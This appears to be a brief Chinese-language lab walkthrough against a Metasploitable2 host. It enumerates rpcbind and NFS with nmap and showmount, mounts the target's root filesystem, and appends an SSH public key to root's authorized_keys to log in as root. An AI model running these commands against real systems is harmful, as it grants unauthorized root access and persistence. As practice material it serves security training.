# 111_rpcbind

使用nmap扫描

> nmap -v -p 111 -sV -T4 --version-all --script=rpcinfo 10.10.10.6

![image-20210318223424342](../../image/meteaspolitale2/image-20210318223424342.png)

找到nfs的服务了

使用showmount查看挂载的目录

>  showmount -e 10.10.10.6

![image-20210318223740715](../../image/meteaspolitale2/image-20210318223740715.png)

在攻击机里创建ssh密钥

> ssh-keygen

![image-20210318223922837](../../image/meteaspolitale2/image-20210318223922837.png)

创建挂载点

> mkdir /tmp/root

![image-20210318224059595](../../image/meteaspolitale2/image-20210318224059595.png)

> mount -t nfs 10.10.10.6:/ /tmp/root

![image-20210318224134272](../../image/meteaspolitale2/image-20210318224134272.png)

把密钥添加到靶机的.ssh目录下的authorized_keys文件里

> cat ~/.ssh/id_rsa.pub >> /tmp/root/root/.ssh/authorized_keys

![image-20210318224412994](../../image/meteaspolitale2/image-20210318224412994.png)

ssh连接

![image-20210318225054021](../../image/meteaspolitale2/image-20210318225054021.png)

直接连接成功